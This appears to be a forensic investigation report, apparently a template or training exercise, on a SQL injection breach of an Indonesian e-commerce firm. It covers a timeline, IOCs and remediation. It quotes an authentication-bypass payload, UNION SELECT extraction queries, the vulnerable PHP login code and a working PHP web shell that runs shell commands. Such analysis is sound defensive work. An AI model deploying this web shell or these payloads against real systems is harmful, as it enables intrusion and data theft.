# Digital Forensic Investigation Report
## PT. TechMart Indonesia Data Breach Incident

---

**Document Classification:** STRICTLY CONFIDENTIAL  
**Case Number:** DFIR-2024-001  
**Report Version:** 1.0

---

## Cover Page

| Field | Information |
|-------|-------------|
| **Report Title** | Digital Forensic Investigation Report |
| **Incident Type** | Data Breach via SQL Injection |
| **Client** | PT. TechMart Indonesia |
| **Investigation Period** | [START DATE] - [END DATE] |
| **Lead Investigator** | [Nama Investigator] |
| **Report Date** | [DATE] |
| **Classification** | STRICTLY CONFIDENTIAL |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Investigation Scope](#2-investigation-scope)
3. [Evidence Collection](#3-evidence-collection)
4. [Timeline of Events](#4-timeline-of-events)
5. [Technical Analysis](#5-technical-analysis)
6. [Attack Attribution](#6-attack-attribution)
7. [Impact Assessment](#7-impact-assessment)
8. [Conclusions](#8-conclusions)
9. [Recommendations](#9-recommendations)
10. [Appendices](#10-appendices)

---

## 1. Executive Summary

### 1.1 Overview

Pada tanggal [DATE], PT. TechMart Indonesia mengalami insiden keamanan berupa data breach yang berdampak pada kebocoran data pelanggan. Investigasi forensik digital dilakukan untuk menentukan akar penyebab, ruang lingkup dampak, dan memberikan rekomendasi pencegahan.

### 1.2 Key Findings

| Finding | Description |
|---------|-------------|
| **Attack Vector** | SQL Injection pada aplikasi e-commerce |
| **Entry Point** | `login.php` - vulnerable login form |
| **Data Compromised** | ~50,000 customer records |
| **Attack Duration** | ~4 hours (02:15 - 06:30 WIB) |
| **Attacker IP** | 192.168.56.20 (internal network / pivot point) |
| **Detection Time** | [TIME] - detected by SIEM alert |

### 1.3 Summary of Impact

- **Confidentiality:** HIGH - Customer PII and payment data exposed
- **Integrity:** MEDIUM - Database integrity compromised
- **Availability:** LOW - No service disruption observed

### 1.4 Root Cause

Insiden terjadi karena kombinasi faktor:
1. Kerentanan SQL Injection pada aplikasi web
2. Tidak adanya Web Application Firewall
3. Validasi input yang tidak memadai
4. Logging dan monitoring yang insufficient

---

## 2. Investigation Scope

### 2.1 Objectives

1. Menentukan vektor serangan dan metode yang digunakan
2. Mengidentifikasi data yang terekspos
3. Merekonstruksi timeline serangan
4. Mengidentifikasi indikator kompromi (IOC)
5. Memberikan rekomendasi remediasi

### 2.2 Systems Examined

| System | IP Address | Role | Evidence Collected |
|--------|------------|------|-------------------|
| Web Server | 192.168.56.10 | E-commerce frontend | Disk image, logs |
| Database Server | 192.168.56.11 | MySQL database | Query logs, audit |
| Network Devices | Various | Routing/Firewall | NetFlow, logs |
| Backup Server | 192.168.56.30 | Backup storage | Integrity check |

### 2.3 Investigation Team

| Name | Role | Organization |
|------|------|--------------|
| [Name] | Lead Forensic Investigator | [Company] |
| [Name] | Malware Analyst | [Company] |
| [Name] | Network Analyst | [Company] |
| [Name] | Legal Advisor | [Law Firm] |

### 2.4 Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| Autopsy | 4.21.0 | Disk forensics |
| Volatility | 3.x | Memory analysis |
| Wireshark | 4.2.x | Network analysis |
| Log2Timeline | 0.27 | Timeline creation |
| ELK Stack | 8.x | Log analysis |

---

## 3. Evidence Collection

### 3.1 Chain of Custody

Semua bukti dikumpulkan mengikuti prosedur chain of custody yang ketat. Detail lengkap tersedia di dokumen CoC terpisah.

### 3.2 Evidence Inventory

| ID | Description | Collection Date | SHA-256 Hash | Custodian |
|----|-------------|-----------------|--------------|-----------|
| EVD-001 | Web server disk image | [DATE] | [HASH] | [Name] |
| EVD-002 | Memory dump web server | [DATE] | [HASH] | [Name] |
| EVD-003 | Apache access logs | [DATE] | [HASH] | [Name] |
| EVD-004 | MySQL query logs | [DATE] | [HASH] | [Name] |
| EVD-005 | Network capture (PCAP) | [DATE] | [HASH] | [Name] |
| EVD-006 | Firewall logs | [DATE] | [HASH] | [Name] |
| EVD-007 | System auth logs | [DATE] | [HASH] | [Name] |

### 3.3 Forensic Imaging

```
Web Server Disk Image (EVD-001):
================================
Tool: dd with dcfldd verification
Source: /dev/sda (500GB)
Destination: /forensic/evidence/techmart_webserver.dd
Acquisition Date: [DATE TIME]
Acquisition Hash: 
  MD5: d41d8cd98f00b204e9800998ecf8427e
  SHA-256: e3b0c44298fc1c149afbf4c8996fb924...

Verification Status: ✓ VERIFIED
```

---

## 4. Timeline of Events

### 4.1 Attack Timeline (MITRE ATT&CK Mapped)

```
Timeline Rekonstruksi Serangan PT. TechMart Indonesia
=====================================================

[DATE - 02:15:33 WIB] RECONNAISSANCE (TA0043)
├── First connection from 192.168.56.20
├── Port scanning detected (nmap signature)
├── Technique: T1595 - Active Scanning
└── Evidence: Apache access log, firewall log

[DATE - 02:23:15 WIB] RECONNAISSANCE (TA0043)
├── Web application fingerprinting
├── robots.txt and common paths accessed
├── Technique: T1592 - Gather Victim Host Info
└── Evidence: Apache access log

[DATE - 02:31:47 WIB] INITIAL ACCESS (TA0001)
├── SQL injection attempts on login.php
├── Multiple payloads tested
├── Technique: T1190 - Exploit Public-Facing Application
└── Evidence: Apache access log, MySQL log

[DATE - 02:45:22 WIB] INITIAL ACCESS (TA0001)
├── Successful authentication bypass
├── Payload: ' OR '1'='1' --
├── Technique: T1190 - Exploit Public-Facing Application
└── Evidence: MySQL query log, login_attempts table

[DATE - 03:12:08 WIB] DISCOVERY (TA0007)
├── Database enumeration via UNION SELECT
├── Table and column discovery
├── Technique: T1082 - System Information Discovery
└── Evidence: MySQL query log

[DATE - 03:45:33 WIB] COLLECTION (TA0009)
├── Customer data extraction begins
├── UNION-based data exfiltration
├── Technique: T1005 - Data from Local System
└── Evidence: MySQL query log, network capture

[DATE - 04:30:00 WIB] COLLECTION (TA0009)
├── Mass data extraction in progress
├── ~25,000 records extracted
├── Technique: T1119 - Automated Collection
└── Evidence: Network traffic analysis

[DATE - 05:15:22 WIB] PERSISTENCE (TA0003)
├── Backdoor installation attempted
├── Webshell uploaded to /uploads/
├── Technique: T1505.003 - Web Shell
└── Evidence: Disk analysis, webshell file

[DATE - 05:45:00 WIB] COLLECTION (TA0009)
├── Data extraction continues
├── Additional ~25,000 records extracted
├── Evidence: Network capture

[DATE - 06:15:47 WIB] EXFILTRATION (TA0010)
├── Data exfiltration to external server
├── Destination: [EXTERNAL IP]
├── Technique: T1041 - Exfiltration Over C2 Channel
└── Evidence: Network capture, firewall log

[DATE - 06:30:00 WIB] DETECTION
├── SIEM alert triggered
├── Anomalous database queries detected
├── Incident response initiated
└── Evidence: SIEM logs

[DATE - 06:45:00 WIB] CONTAINMENT
├── Attacker connection terminated
├── Web server isolated
├── Forensic preservation begun
└── Evidence: IR logs
```

### 4.2 Visual Timeline

```
02:00    03:00    04:00    05:00    06:00    07:00
  |        |        |        |        |        |
  ├──────RECON──────┤
  |   Port scan     |
  |   Fingerprint   |
           ├──────INITIAL ACCESS──────┤
           |   SQLi attempts         |
           |   Auth bypass           |
                    ├──────DISCOVERY──────┤
                    |   DB enumeration   |
                             ├──────COLLECTION──────────────┤
                             |   Data extraction           |
                             |   Backdoor install          |
                                              ├──EXFIL──┤
                                              |        |
                                                      ├─DETECTED
```

---

## 5. Technical Analysis

### 5.1 Attack Vector Analysis

#### 5.1.1 SQL Injection Vulnerability

**Location:** `/var/www/html/login.php`

**Vulnerable Code:**
```php
// VULNERABLE CODE (from disk image)
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username = '$username' 
          AND password = '$password'";
$result = mysqli_query($conn, $query);
```

**Exploitation Evidence:**

Apache Access Log Entry:
```
192.168.56.20 - - [DATE:02:45:22 +0700] "POST /login.php HTTP/1.1" 200 1523 
"-" "Mozilla/5.0 (X11; Linux x86_64)"
```

MySQL Query Log:
```sql
2024-XX-XX 02:45:22 Query    SELECT * FROM users WHERE username = '' 
                            OR '1'='1' -- ' AND password = ''
2024-XX-XX 02:45:22 Query    Query OK, 1 row affected
```

#### 5.1.2 Data Exfiltration Queries

**UNION-based Extraction:**
```sql
-- Evidence dari MySQL query log
2024-XX-XX 03:45:33 Query SELECT * FROM users WHERE username='' 
UNION SELECT id,name,email,phone,credit_card,address,NULL,NULL 
FROM customers-- -'

2024-XX-XX 04:12:45 Query SELECT * FROM customers LIMIT 0,1000
2024-XX-XX 04:15:22 Query SELECT * FROM customers LIMIT 1000,1000
-- Pattern berlanjut hingga 50,000 records
```

#### 5.1.3 Backdoor Analysis

**File:** `/var/www/html/uploads/config.php`

```php
// Extracted backdoor code
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo "<pre>";
    $output = shell_exec($cmd);
    echo $output;
    echo "</pre>";
}
?>
```

**File Metadata:**
- Created: [DATE] 05:15:22
- Modified: [DATE] 05:15:22
- Owner: www-data
- MD5: [HASH]
- SHA-256: [HASH]

### 5.2 Network Analysis

#### 5.2.1 Traffic Summary

| Metric | Value |
|--------|-------|
| Total packets analyzed | 1,245,678 |
| Suspicious connections | 156 |
| Data transferred out | 847 MB |
| Unique source IPs | 3 |

#### 5.2.2 Communication Pattern

```
[192.168.56.20] ──HTTP POST──> [192.168.56.10:80]
     │
     │  SQLi payloads
     │  Response: customer data
     │
     ▼
[192.168.56.20] ──HTTP──> [External IP:443]
     │
     │  Exfiltrated data
     │  Encrypted channel
```

### 5.3 Memory Analysis

Memory dump analisis menggunakan Volatility 3:

```
$ vol -f memory.dump windows.pslist

PID    PPID   ImageFileName    CreateTime
----   ----   -------------    ----------
[Memory analysis results for web server processes]
```

**Findings:**
- Apache process with abnormal memory patterns
- Suspicious strings containing SQL queries
- Evidence of data staging in memory

---

## 6. Attack Attribution

### 6.1 Attacker Profile

| Attribute | Assessment |
|-----------|------------|
| Skill Level | Intermediate |
| Motivation | Financial (data theft) |
| Tools Used | Custom scripts, manual SQLi |
| Origin | Undetermined (used proxy) |

### 6.2 Indicators of Compromise (IOC)

#### 6.2.1 Network IOCs

| Type | Value | Description |
|------|-------|-------------|
| IP | 192.168.56.20 | Attack source (internal pivot) |
| IP | [External IP] | Exfiltration destination |
| User-Agent | `sqlmap/1.7` | SQLi tool signature |
| User-Agent | `Mozilla/5.0 (X11; Linux...)` | Manual access |

#### 6.2.2 File IOCs

| Filename | Path | Hash (SHA-256) |
|----------|------|----------------|
| config.php | /uploads/ | [HASH] |
| .htaccess | /uploads/ | [HASH] |

#### 6.2.3 Behavioral IOCs

- Multiple failed login attempts from single IP
- UNION SELECT queries in web logs
- Large data transfer during non-business hours
- Access to sensitive tables (customers, orders)

### 6.3 MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name |
|--------|--------------|----------------|
| Reconnaissance | T1595 | Active Scanning |
| Initial Access | T1190 | Exploit Public-Facing App |
| Persistence | T1505.003 | Web Shell |
| Discovery | T1082 | System Info Discovery |
| Collection | T1005 | Data from Local System |
| Exfiltration | T1041 | Exfil Over C2 Channel |

---

## 7. Impact Assessment

### 7.1 Data Impact

| Data Type | Records Affected | Sensitivity |
|-----------|-----------------|-------------|
| Customer Names | 50,000 | Medium |
| Email Addresses | 50,000 | Medium |
| Phone Numbers | 50,000 | Medium |
| Physical Addresses | 50,000 | High |
| Credit Card Numbers | 50,000 | Critical |
| Transaction History | 125,000 | High |

### 7.2 Business Impact

| Impact Area | Assessment | Estimated Cost (IDR) |
|-------------|------------|---------------------|
| Incident Response | High | 200,000,000 |
| Legal/Regulatory | High | 500,000,000 |
| Customer Notification | Medium | 100,000,000 |
| Credit Monitoring | High | 250,000,000 |
| Reputation Damage | High | 1,000,000,000 |
| Security Improvements | High | 750,000,000 |
| **Total** | | **2,800,000,000** |

### 7.3 Regulatory Implications

| Regulation | Applicability | Potential Penalty |
|------------|---------------|-------------------|
| UU PDP (Indonesia) | Yes | Up to 2% revenue |
| PCI-DSS | Yes | $5,000-$100,000/month |
| GDPR (if EU data) | TBD | Up to €20M or 4% revenue |

---

## 8. Conclusions

### 8.1 Summary of Findings

1. **Attack Vector Confirmed:** SQL Injection vulnerability dalam aplikasi e-commerce

2. **Data Breach Confirmed:** Sekitar 50,000 record pelanggan terekspos termasuk data pembayaran

3. **Attack Duration:** Serangan berlangsung selama ~4 jam sebelum terdeteksi

4. **Persistence Established:** Attacker berhasil menginstall backdoor

5. **Root Cause:** Kombinasi kerentanan aplikasi dan kurangnya security controls

### 8.2 Contributing Factors

1. Vulnerable code dengan improper input validation
2. Tidak ada Web Application Firewall
3. Insufficient monitoring dan alerting
4. Password database tidak di-hash dengan benar
5. Data sensitif tidak dienkripsi at rest

### 8.3 Attacker Assessment

Berdasarkan teknik dan tools yang digunakan, attacker memiliki skill level intermediate dengan motivasi finansial. Tidak ditemukan bukti keterlibatan insider.

---

## 9. Recommendations

### 9.1 Immediate Actions (0-7 days)

| # | Action | Priority | Owner |
|---|--------|----------|-------|
| 1 | Patch SQL injection vulnerability | Critical | Dev Team |
| 2 | Remove backdoor files | Critical | IT Security |
| 3 | Reset all user credentials | Critical | IT Admin |
| 4 | Deploy WAF with SQLi rules | Critical | Network Team |
| 5 | Notify affected customers | High | Legal/PR |
| 6 | Report to regulators | High | Legal |
| 7 | Engage credit monitoring service | High | Finance |

### 9.2 Short-term Actions (7-30 days)

| # | Action | Priority | Owner |
|---|--------|----------|-------|
| 8 | Security code review | High | Dev Team |
| 9 | Implement parameterized queries | High | Dev Team |
| 10 | Deploy EDR solution | High | IT Security |
| 11 | Enhance logging & monitoring | High | IT Ops |
| 12 | Penetration testing | Medium | External |
| 13 | Security awareness training | Medium | HR |

### 9.3 Long-term Actions (30-90 days)

| # | Action | Priority | Owner |
|---|--------|----------|-------|
| 14 | Implement DevSecOps pipeline | Medium | Dev Team |
| 15 | Deploy SIEM solution | Medium | IT Security |
| 16 | Conduct full security assessment | Medium | External |
| 17 | Update incident response plan | Medium | IT Security |
| 18 | PCI-DSS compliance audit | High | Compliance |
| 19 | Regular vulnerability scanning | Medium | IT Security |

### 9.4 Security Architecture Recommendations

```
┌─────────────────────────────────────────────────────────────────┐
│                    RECOMMENDED ARCHITECTURE                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  [Internet]                                                     │
│      │                                                          │
│      ▼                                                          │
│  ┌───────────────┐                                             │
│  │   CDN/DDoS    │  ◄── Layer 3/4 protection                   │
│  └───────────────┘                                             │
│      │                                                          │
│      ▼                                                          │
│  ┌───────────────┐                                             │
│  │     WAF       │  ◄── SQL injection, XSS protection          │
│  └───────────────┘                                             │
│      │                                                          │
│      ▼                                                          │
│  ┌───────────────┐                                             │
│  │  Load Balancer │  ◄── SSL termination, health checks       │
│  └───────────────┘                                             │
│      │                                                          │
│      ▼                                                          │
│  ┌───────────────┐     ┌───────────────┐                       │
│  │  Web Server   │────►│   Database    │                       │
│  │  (Hardened)   │     │  (Encrypted)  │                       │
│  └───────────────┘     └───────────────┘                       │
│          │                     │                                │
│          ▼                     ▼                                │
│  ┌─────────────────────────────────────────┐                   │
│  │              SIEM / SOC                  │                   │
│  │   Log collection, correlation, alerting │                   │
│  └─────────────────────────────────────────┘                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 10. Appendices

### Appendix A: Evidence Hash Values

| Evidence ID | MD5 | SHA-256 |
|-------------|-----|---------|
| EVD-001 | [MD5] | [SHA256] |
| EVD-002 | [MD5] | [SHA256] |
| EVD-003 | [MD5] | [SHA256] |
| EVD-004 | [MD5] | [SHA256] |
| EVD-005 | [MD5] | [SHA256] |
| EVD-006 | [MD5] | [SHA256] |
| EVD-007 | [MD5] | [SHA256] |

### Appendix B: IOC Export (STIX Format)

```json
{
  "type": "bundle",
  "id": "bundle--techmart-incident",
  "objects": [
    {
      "type": "indicator",
      "pattern": "[ipv4-addr:value = '192.168.56.20']",
      "valid_from": "2024-01-01T00:00:00Z"
    },
    {
      "type": "indicator", 
      "pattern": "[file:hashes.SHA-256 = '[BACKDOOR_HASH]']",
      "valid_from": "2024-01-01T00:00:00Z"
    }
  ]
}
```

### Appendix C: Raw Log Samples

**Apache Access Log (sanitized):**
```
192.168.56.20 - - [XX/Jan/2024:02:45:22 +0700] "POST /login.php HTTP/1.1" 200 1523
192.168.56.20 - - [XX/Jan/2024:03:12:08 +0700] "GET /search.php?q='+UNION+SELECT... HTTP/1.1" 200 45678
[Additional log entries...]
```

### Appendix D: Tool Output Samples

```
# Autopsy Case Summary
Case: TechMart_DFIR_2024
Data Sources: 1
Files Analyzed: 125,456
Artifacts Found: 2,345
```

### Appendix E: Glossary

| Term | Definition |
|------|------------|
| APT | Advanced Persistent Threat |
| C2 | Command and Control |
| EDR | Endpoint Detection and Response |
| IOC | Indicator of Compromise |
| PCAP | Packet Capture |
| SIEM | Security Information and Event Management |
| SQLi | SQL Injection |
| WAF | Web Application Firewall |

---

## Declaration

I, [INVESTIGATOR NAME], hereby declare that this report represents a true and accurate account of the forensic investigation conducted. All evidence was handled in accordance with established forensic procedures, and the findings presented are based on objective analysis of the collected evidence.

**Lead Investigator:**

Signature: _______________________

Name: [NAME]

Date: [DATE]

Certification: [CERTIFICATION NUMBER]

---

**End of Report**

*This document contains confidential information and is intended only for the authorized recipients. Unauthorized disclosure is prohibited.*
